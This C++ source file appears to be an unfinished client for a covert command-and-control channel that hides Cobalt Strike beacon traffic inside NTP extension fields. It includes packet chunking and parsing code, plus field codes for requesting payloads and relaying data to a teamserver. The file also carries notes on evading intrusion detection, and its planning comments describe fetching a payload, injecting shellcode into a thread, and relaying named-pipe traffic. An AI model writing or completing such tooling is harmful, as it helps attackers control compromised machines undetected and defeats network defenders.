/*

CS-EXTC2-NTP


Extension Field Key:

0x4d, 0x5a: Give me a payload. When the server sees this, a payload will be sent back
	> This should likely change. 0x4d, 0x5a has a great chance at getting picked up as a "binary" by IDS tools

0xAA,0xBB: Getting team server data from server to go to beacon
0xBB,0xAA: Sending beacon data back to server


*/



#include <iostream>
#include "createntp.hpp"
#include "parsentp.hpp"
#include "ntp.hpp"
#include "constants.hpp"
#include "helpers.hpp"
#include "net.hpp"
#include <vector>

std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField) {
	//1. Calculate size of data, (data.size()), then send a sizePacket to server. If OK, continue
	size_t dataSize = data.size();
	
	////send initial packet with size of total message
	//auto packet = NTPPacket();
	//packet.addExtensionField(
	//	extensionField, //NtpExtensionField::giveMePayload,
	//	chunkData
	//);

	//std::vector < uint8_t> packet_bytes = packet.getPacket();
	////placeholder, should return a vector, of the full NTP packet
	//std::vector<uint8_t> response = sendChunk(packet_bytes);
	//
	
	std::vector<uint8_t> responseDataBuffer = {};




	//int amountOfChunks = dataSize / Chunk::maxChunkSize;
	int amountOfChunks = (dataSize + Chunk::maxChunkSize - 1) / Chunk::maxChunkSize; //gives you one extra chunk for remainder

	std::cout << "[?] Data of size " << dataSize << " will need " << amountOfChunks << " chunks to send. Max Chunk Size: " << Chunk::maxChunkSize << std::endl;

	// Loop over each chunk index
	for (int i = 0; i < amountOfChunks; ++i) { //++i as we want to get the last chunk
		size_t start = i * Chunk::maxChunkSize; //get how far into the data we need to be to get the chunk
		size_t end = std::min(start + Chunk::maxChunkSize, dataSize); //gets the smaller of the 2, whether that be dataSize, or start+maxChunkSize. TLDR, prevents trying to read outside of func arg provided data buffer (which is only so big)

		std::vector<uint8_t> chunkData(data.begin() + start, data.begin() + end);

		std::cout << "[" << i << "/" << amountOfChunks << "]" << " ChunkData: ";
		printHexVector(chunkData);


		//creat ntp packet first
		auto packet = NTPPacket();
		packet.addExtensionField(
			extensionField, //NtpExtensionField::giveMePayload,
			chunkData
		);
		//pass full ntp packet 
		std::vector < uint8_t> packet_bytes = packet.getPacket();
		//placeholder, should return a vector, of the full NTP packet
		std::vector<uint8_t> response = sendChunk(packet_bytes);

		//Parse NTP packet, get data out of it (or whatever else is needed)
		NTPPacketParser packetParser = NTPPacketParser(response);
		//Get extension data:
		std::vector<uint8_t> extensionData = packetParser.getExtensionData();

		//take extracted extension data, put into buffer
		responseDataBuffer.insert(responseDataBuffer.end(), extensionData.begin(), extensionData.end()); // append response to responseBuffer

	}
	//print full response data
	std::cout << "Full Data from Responses: ";
	printHexVector(responseDataBuffer);


	//when done looping, return array
	//std::vector<uint8_t> placehodlerVec = {};
	return responseDataBuffer;
}


int main() {
	//Stuff here

	std::cout << "Started" << std::endl;

	//Create pcaket
	auto packet = NTPPacket();
	//packet.printPacket();

	std::vector<uint8_t> packetData = {0xDE,0xAD,0xBE,0xEF};
	packet.addExtensionField(
		NtpExtensionField::giveMePayload,
		packetData
	);

	//packet.printPacket();


	//parse the created packet (testing parser)
	std::vector < uint8_t> packet_bytes = packet.getPacket();
	NTPPacketParser packetParser = NTPPacketParser(packet_bytes);
	std::vector<uint8_t> extensionData = packetParser.getExtensionData();

	std::cout << "[?] extensionData (From Main):";
	printHexVector(extensionData);
	std::cout << std::endl;


	//print full packet
	//packet.printPacket();
	printHexVectorPacket(packet_bytes);
	chunker(packet_bytes, NtpExtensionField::sendDataToTeamserver);

}


//Note, have payload functino be simiar to above, but diff due to data coming back and needing to be retuend

//void logic() {

	//! Need a dedicated chunking function, that does the chunking logic,and just easily returns the response fromthe server

	//3 seperate functions of how to do this now:

	//GetPayload function(){};
	//Create payload packet (giveMePayload)

	//Send giveMePayload packet
		// > Get size of payload from sizePacket
		// > iterate over payload chunks until data = what was in size packet


	//InjectPayload function();
	//Injection method for running shellcode, go with basic injection method, with a thread.

	//ReadPipe Function();
	//attempt to read pipe
		//	
		//send data to teamserver: sendDataToTeamServer
		//recieve data from teamserver with getDataFromTeamserver, in response

	//attempt to write to pipe
	//goto attempt to read pipe
//}

/*
Next steps:

// Standard data transfer

Figure out chunking. Might be best to one func this, or class it. OneFunc may be easier short term 
 - Initial packet to say overall size (maybe extensionField of 0x51 0x33) //bad SIZE rep in hex: 0x51 0x23

 - After initial packet, wait for next packet, which will be first in data packets. Math can be done for how many packets to expect

 - After packets are done, return completed buffer (in a vector). That can get passed to whatever it needs to


 // Payload Retrieval

Uses the same exact chunker as above, BUT, uses adiff header. Maybe '0x10 0xAD' for (pay)load

Then call injection logic to run payload.

*/